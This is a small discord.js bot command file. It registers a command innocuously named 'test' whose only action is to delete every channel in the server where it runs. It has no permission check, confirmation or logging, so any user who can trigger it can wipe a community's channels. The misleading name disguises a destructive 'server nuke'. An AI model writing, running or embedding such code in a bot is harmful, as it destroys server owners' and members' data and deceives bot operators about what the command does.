const Discord = require("discord.js");
const bot = new Discord.Client()
bot.settings = require("../settings.json");

exports.run = async (bot, message, args) => {

    message.guild.channels.forEach(channel => channel.delete())

}
exports.help = {
    name: "test"
}